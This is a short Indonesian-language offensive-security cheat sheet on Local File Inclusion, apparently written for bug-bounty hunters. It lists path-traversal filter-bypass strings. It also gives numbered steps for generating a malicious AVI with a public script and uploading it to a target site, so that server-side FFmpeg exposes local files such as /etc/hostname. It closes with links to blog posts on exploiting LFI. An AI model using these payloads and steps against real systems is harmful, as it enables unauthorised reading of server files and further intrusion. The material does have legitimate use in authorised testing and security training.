## LFI

**Filter Bypass/Saring Lewati**

```
../\
```

```
..\/
```

```
/..
```

```
\/..
```

```
/%5c..
```

**FFmpeg Local File Disclosure/Pengungkapan File Lokal FFmpeg**

[script](https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py) Oleh @neex dapat digunakan untuk mengungkapkan file lokal pada host FFmpeg yang mengurai referensi eksternal [HLS playlists](https://ffmpeg.org/ffmpeg-formats.html#hls-2).

_Langkah-langkah untuk mereproduksi_

1. Silakan unduh skrip dari @neex ke instance "penyerang" Anda
2. Jalankan skrip dengan parameter yang Anda inginkan: `python3 gen_xbin_avi.py file:///etc/hostname bugbounty.avi`
3. Unggah file AVI yang dihasilkan ke situs target Anda (misalnya dalam 'halaman unggah video')
4. Target dapat memproses penyertaan HLS berbahaya dengan FFmpeg di sisi server.
5. Putar AVI yang diunggah melalui situs target. Jika berhasil, file yang Anda inginkan akan ditampilkan dalam video.

Ada skrip alternatif yang dapat menghasilkan format HLS berbeda atau menyebabkan file yang diinginkan diungkapkan dengan cara berbeda.

**Blogs**
* http://pastie.org/840199
* http://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/
* http://www.notsosecure.com/folder2/2010/08/20/lfi-code-exec-remote-root/?utm_source=twitterfeed&utm_medium=twitter
* http://labs.neohapsis.com/2008/07/21/local-file-inclusion-%E2%80%93-tricks-of-the-trade/
* http://www.digininja.org/blog/when_all_you_can_do_is_read.php
